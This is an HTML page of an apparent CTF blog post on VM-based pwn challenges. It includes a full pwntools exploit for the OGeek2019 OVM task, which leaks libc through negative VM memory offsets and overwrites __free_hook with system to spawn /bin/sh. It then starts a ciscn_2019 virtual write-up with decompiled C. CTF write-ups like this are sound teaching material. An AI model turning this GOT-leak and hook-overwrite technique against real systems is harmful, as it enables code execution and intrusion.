

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>VMpwn - J4f&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="VMpwn" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ShlomoJune.github.io/posts/vmpwn/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-10-23T23:27:58+08:00" />
<meta property="article:modified_time" content="2025-10-23T23:27:58+08:00" />

<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="VMpwn"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="J4f&#39;s blog">
<meta name="apple-mobile-web-app-title" content="J4f&#39;s blog">

<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ShlomoJune.github.io/posts/vmpwn/" /><link rel="prev" href="http://ShlomoJune.github.io/posts/cpp_pwn/" /><link rel="next" href="http://ShlomoJune.github.io/posts/read_rsdzh/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "VMpwn",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http://ShlomoJune.github.io/posts/vmpwn/"
        },"genre": "posts","wordcount":  3737 ,
        "url": "http://ShlomoJune.github.io/posts/vmpwn/","datePublished": "2025-10-23T23:27:58+08:00","dateModified": "2025-10-23T23:27:58+08:00","publisher": {
            "@type": "Organization",
            "name": "Author"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('light' === 'light' || 'light' === 'dark' || 'light' === 'black') setTheme('light'), saveTheme('light'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="J4f&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="J4f&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#ogeek2019-finalovm">[OGeek2019 Final]OVM</a>
      <ul>
        <li><a href="#思路">思路</a></li>
        <li><a href="#exp">exp</a></li>
      </ul>
    </li>
    <li><a href="#ciscn_2019_qual_virtual">ciscn_2019_qual_virtual</a>
      <ul>
        <li><a href="#exp-1">exp</a></li>
      </ul>
    </li>
    <li><a href="#长城杯pwn---avm">长城杯pwn&mdash;avm</a>
      <ul>
        <li><a href="#思路-1">思路</a></li>
        <li><a href="#exp-2">exp</a></li>
      </ul>
    </li>
    <li><a href="#2020网鼎杯青龙组-boom1">2020网鼎杯青龙组-boom1</a></li>
    <li><a href="#0ctftctf-2022-ezvm">0CTF/TCTF 2022 ezvm</a>
      <ul>
        <li><a href="#exp-3">exp</a></li>
      </ul>
    </li>
    <li><a href="#tqlctf2022_nemu">TQLCTF2022_nemu</a></li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">VMpwn</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>pwn</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-10-23">2025-10-23</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-10-23">2025-10-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3737 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;18 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#ogeek2019-finalovm">[OGeek2019 Final]OVM</a>
      <ul>
        <li><a href="#思路">思路</a></li>
        <li><a href="#exp">exp</a></li>
      </ul>
    </li>
    <li><a href="#ciscn_2019_qual_virtual">ciscn_2019_qual_virtual</a>
      <ul>
        <li><a href="#exp-1">exp</a></li>
      </ul>
    </li>
    <li><a href="#长城杯pwn---avm">长城杯pwn&mdash;avm</a>
      <ul>
        <li><a href="#思路-1">思路</a></li>
        <li><a href="#exp-2">exp</a></li>
      </ul>
    </li>
    <li><a href="#2020网鼎杯青龙组-boom1">2020网鼎杯青龙组-boom1</a></li>
    <li><a href="#0ctftctf-2022-ezvm">0CTF/TCTF 2022 ezvm</a>
      <ul>
        <li><a href="#exp-3">exp</a></li>
      </ul>
    </li>
    <li><a href="#tqlctf2022_nemu">TQLCTF2022_nemu</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="ogeek2019-finalovm" class="headerLink">
    <a href="#ogeek2019-finalovm" class="header-mark"></a>[OGeek2019 Final]OVM</h2><p>buuctf的一道题</p>
<p>docker pull roderickchan/debug_pwn_env:16.04-2.23-0ubuntu11.3-20240412</p>
<p>先输入<code>pc</code>、<code>sp</code>、<code>code size</code></p>
<ul>
<li>pc：将指令写入memory的偏移，置0就行</li>
<li>sp：push、pop指令写入栈的偏移，置0就行</li>
<li>code size：增加一条opcode，opcode size就要加1</li>
</ul>
<p>vm指令：</p>
<ul>
<li>0x10：mov reg[high]，low</li>
<li>0x20：mov reg[high]，0</li>
<li>0x30：mov reg[high]，memory[reg[low]]</li>
<li>0x40：mov memory[reg[low]]，reg[high]</li>
<li>0x50：PUSH：push reg[high] ，sp++</li>
<li>0x60：POP： pop[high]，sp&ndash;</li>
<li>0x70：ADD： reg[high] = reg[low] + reg[medium]</li>
<li>0x80：SUB：reg[high] = reg[medium] - reg[low]</li>
<li>0x90：AND： reg[high] = reg[low] &amp; reg[medium]</li>
<li>0xa0：OR：reg[high] = reg[low] | reg[medium]</li>
<li>0xb0：XOR：reg[high] = reg[low] ^ reg[medium]</li>
<li>0xc0：SHL：reg[high] = reg[medium] &laquo; reg[low]</li>
<li>0xd0：SHR：reg[high] = reg[medium] &raquo; reg[low]</li>
<li>0xe0：EXIT：停止执行</li>
</ul>
<h3 id="思路" class="headerLink">
    <a href="#%e6%80%9d%e8%b7%af" class="header-mark"></a>思路</h3><p>可以往memory[]中写入负数偏移，指向got表中的stderr_ptr，再根据偏移找到free_hook，让comment指向free_hook-0x8,往free_hook-0x8开始的数据写入<code>b'/bin/sh\x00'+p64(sys_addr)</code>,这样free(comment)，就是system(&quot;/bin/sh&quot;)</p>
<h3 id="exp" class="headerLink">
    <a href="#exp" class="header-mark"></a>exp</h3><p>（拿了别的师傅的exp）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
</span></span><span class="line"><span class="cl">context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
</span></span><span class="line"><span class="cl">context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">address = &#39;./pwn&#39;
</span></span><span class="line"><span class="cl"># address = &#39;./pwn_patched&#39;
</span></span><span class="line"><span class="cl">elf = ELF(address)
</span></span><span class="line"><span class="cl">libc = elf.libc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#-----------------------------------------------------------------
</span></span><span class="line"><span class="cl">s       = lambda data               :p.send(data)
</span></span><span class="line"><span class="cl">ss      = lambda data               :p.send(str(data))
</span></span><span class="line"><span class="cl">sa      = lambda delim,data         :p.sendafter(str(delim), data)
</span></span><span class="line"><span class="cl">sl      = lambda data               :p.sendline(data)
</span></span><span class="line"><span class="cl">sls     = lambda data               :p.sendline(str(data))
</span></span><span class="line"><span class="cl">sla     = lambda delim,data         :p.sendlineafter(delim, data)
</span></span><span class="line"><span class="cl">r       = lambda num                :p.recv(num)
</span></span><span class="line"><span class="cl">ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
</span></span><span class="line"><span class="cl">itr     = lambda                    :p.interactive()
</span></span><span class="line"><span class="cl">uu32    = lambda data               :u32(data.ljust(4,b&#39;\x00&#39;))
</span></span><span class="line"><span class="cl">uu64    = lambda data               :u64(data.ljust(8,b&#39;\x00&#39;))
</span></span><span class="line"><span class="cl"># lg      = lambda s,addr		        : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s,addr))
</span></span><span class="line"><span class="cl">lg      = lambda s			        : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
</span></span><span class="line"><span class="cl">l64     = lambda                    :u64(p.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8,b&#34;\x00&#34;))
</span></span><span class="line"><span class="cl">l32     = lambda                    :u32(p.recvuntil(&#34;\xf7&#34;)[-4:].ljust(4,b&#34;\x00&#34;))
</span></span><span class="line"><span class="cl">r64     = lambda                    :u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
</span></span><span class="line"><span class="cl">ir64    = lambda                    :int(p.recv(14),16)
</span></span><span class="line"><span class="cl">#-----------------------------------------------------------------
</span></span><span class="line"><span class="cl">gdbscript = \
</span></span><span class="line"><span class="cl">&#34;&#34;&#34;
</span></span><span class="line"><span class="cl">    sbase 0x202060
</span></span><span class="line"><span class="cl">    sbase 0x202460
</span></span><span class="line"><span class="cl">    c
</span></span><span class="line"><span class="cl">&#34;&#34;&#34;
</span></span><span class="line"><span class="cl">if len(sys.argv) &gt; 1 and sys.argv[1] == &#34;r&#34;:
</span></span><span class="line"><span class="cl">    p = remote(&#34;node5.buuoj.cn&#34;,29198 )
</span></span><span class="line"><span class="cl">elif len(sys.argv) &gt; 1 and sys.argv[1] == &#34;d&#34;:
</span></span><span class="line"><span class="cl">    p = gdb.debug(address, gdbscript = gdbscript)
</span></span><span class="line"><span class="cl">else:
</span></span><span class="line"><span class="cl">    p = process(address)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def dbg():
</span></span><span class="line"><span class="cl">    gdb.attach(p)
</span></span><span class="line"><span class="cl">    # gdb.attach(p, gdbscript=gdbscript)
</span></span><span class="line"><span class="cl">    # pause()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#def opcode(op,high,medium,low):
</span></span><span class="line"><span class="cl">#    pl = (op &lt;&lt; 24) + (high &lt;&lt; 16) + (medium &lt;&lt; 8) + (low)
</span></span><span class="line"><span class="cl">#    print(&#34;---&gt;&#34;,hex(pl))
</span></span><span class="line"><span class="cl">#    sl(str(pl))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#sla(b&#34;PC: &#34;,str(0))
</span></span><span class="line"><span class="cl">#sla(b&#34;SP: &#34;,str(1))
</span></span><span class="line"><span class="cl">#sla(b&#34;CODE SIZE: &#34;,str(4))
</span></span><span class="line"><span class="cl">#ru(b&#34;CODE: &#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##create a stderr address in reg array
</span></span><span class="line"><span class="cl">#opcode(0x10,0,0,26)     #mov reg[0],26
</span></span><span class="line"><span class="cl">#opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
</span></span><span class="line"><span class="cl">#opcode(0x30,4,0,2)      #mov reg[4],memory[reg[2]]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class VM:
</span></span><span class="line"><span class="cl">    def __init__(self):
</span></span><span class="line"><span class="cl">        self.instructions = []
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    def opcode(self, op, high, medium, low):
</span></span><span class="line"><span class="cl">        self.instructions.append((op &lt;&lt; 24) | (high &lt;&lt; 16) | (medium &lt;&lt; 8) | low)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    def send_all(self):
</span></span><span class="line"><span class="cl">        sla(b&#34;PC: &#34;, &#34;0&#34;)
</span></span><span class="line"><span class="cl">        sla(b&#34;SP: &#34;, &#34;0&#34;)
</span></span><span class="line"><span class="cl">        sla(b&#34;CODE SIZE: &#34;, str(len(self.instructions)))
</span></span><span class="line"><span class="cl">        ru(b&#34;CODE: &#34;)
</span></span><span class="line"><span class="cl">        for instr in self.instructions:
</span></span><span class="line"><span class="cl">            sl(str(instr))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># - 0x10：mov reg[high]，low
</span></span><span class="line"><span class="cl"># - 0x20：mov reg[high]，0
</span></span><span class="line"><span class="cl"># - 0x30：mov reg[high]，memory[reg[low]]
</span></span><span class="line"><span class="cl"># - 0x40：mov memory[reg[low]]，reg[high]
</span></span><span class="line"><span class="cl"># - 0x50：PUSH：push reg[high] ，sp++
</span></span><span class="line"><span class="cl"># - 0x60：POP： pop[high]，sp--
</span></span><span class="line"><span class="cl"># - 0x70：ADD： reg[high] = reg[low] + reg[medium]
</span></span><span class="line"><span class="cl"># - 0x80：SUB：reg[high] = reg[medium] - reg[low]
</span></span><span class="line"><span class="cl"># - 0x90：AND： reg[high] = reg[low] &amp; reg[medium]
</span></span><span class="line"><span class="cl"># - 0xa0：OR：reg[high] = reg[low] | reg[medium]
</span></span><span class="line"><span class="cl"># - 0xb0：XOR：reg[high] = reg[low] ^ reg[medium]
</span></span><span class="line"><span class="cl"># - 0xc0：SHL：reg[high] = reg[medium] &lt;&lt; reg[low]
</span></span><span class="line"><span class="cl"># - 0xd0：SHR：reg[high] = reg[medium] &gt;&gt; reg[low]
</span></span><span class="line"><span class="cl"># - 0xe0：EXIT：停止执行
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 使用示例
</span></span><span class="line"><span class="cl">vm = VM()
</span></span><span class="line"><span class="cl">#create a stderr address in reg array
</span></span><span class="line"><span class="cl">#负数偏移指向stderr
</span></span><span class="line"><span class="cl">vm.opcode(0x10, 0, 0, 26)   #mov reg[0], 26 
</span></span><span class="line"><span class="cl">vm.opcode(0x80, 2, 1, 0)    #reg[2] = reg[1]-reg[0] = FFFFFFE6
</span></span><span class="line"><span class="cl">vm.opcode(0x30, 4, 0, 2)    #mov reg[4],memory[reg[2]]
</span></span><span class="line"><span class="cl">vm.opcode(0x10,0,0,25)     #mov reg[0],25
</span></span><span class="line"><span class="cl">vm.opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
</span></span><span class="line"><span class="cl">vm.opcode(0x30,5,0,2)      #mov reg[5],memory[reg[2]]  reg[4][5]---&gt;stderr address
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># create free_hook address through stderr address
</span></span><span class="line"><span class="cl"># stderr + 0x10a0 = free_hook - 0x8
</span></span><span class="line"><span class="cl">vm.opcode(0x10,2,0,0x10)     #mov reg[2],0x10
</span></span><span class="line"><span class="cl">vm.opcode(0x10,0,0,8)      #mov reg[0],8
</span></span><span class="line"><span class="cl">vm.opcode(0xc0,1,2,0)      #reg[1]=sal reg[2],8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">vm.opcode(0x10,2,0,0xa0)   #mov reg[2],0xa0
</span></span><span class="line"><span class="cl">vm.opcode(0x70,1,1,2)      #add reg[1],reg[2]
</span></span><span class="line"><span class="cl">vm.opcode(0x70,4,4,1)      #add reg[4],reg[1]    reg[4][5]---&gt;free_hook address-8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># let pointer comment point to free_hook
</span></span><span class="line"><span class="cl">vm.opcode(0x10,0,0,0x8)     #mov reg[0],8
</span></span><span class="line"><span class="cl">vm.opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0] = FFFFFFF8
</span></span><span class="line"><span class="cl">vm.opcode(0x40,4,0,2)      #mov memory[reg[2]],reg[4]
</span></span><span class="line"><span class="cl">vm.opcode(0x10,0,0,0x7)     #mov reg[0],9
</span></span><span class="line"><span class="cl">vm.opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0]
</span></span><span class="line"><span class="cl">vm.opcode(0x40,5,0,2)      #mov memory[reg[2]],reg[5]
</span></span><span class="line"><span class="cl">vm.send_all()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">p.recvuntil(&#34;R4: &#34;)
</span></span><span class="line"><span class="cl">addr1=int(p.recv(8),16)
</span></span><span class="line"><span class="cl">p.recvuntil(&#34;R5: &#34;)
</span></span><span class="line"><span class="cl">addr2=int(p.recv(4),16)
</span></span><span class="line"><span class="cl">sys_addr=addr1+((addr2)&lt;&lt;32)-0x381410
</span></span><span class="line"><span class="cl">lg(&#34;sys_addr&#34;)
</span></span><span class="line"><span class="cl"># dbg()
</span></span><span class="line"><span class="cl">p.sendafter(&#34;HOW DO YOU FEEL AT OVM?\n&#34;,b&#39;/bin/sh\x00&#39;+p64(sys_addr))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">itr()
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn_2019_qual_virtual" class="headerLink">
    <a href="#ciscn_2019_qual_virtual" class="header-mark"></a>ciscn_2019_qual_virtual</h2><p>先分配几个堆块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">s</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20u</span><span class="p">);</span>                            <span class="c1">// name
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">data</span> <span class="o">=</span> <span class="nf">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">text</span> <span class="o">=</span> <span class="nf">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">stack</span> <span class="o">=</span> <span class="nf">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ptr</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x400u</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>输入数据，将指令转成opcode，数据写入data</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your program name:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">input</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your instruction:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">input</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">get_opcode_numnber</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your stack data:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">input</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">get_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>交互方式大致为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;name:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;j4f&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;instruction:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;push push push add pop&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;stack data:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2 4 6&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>指令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
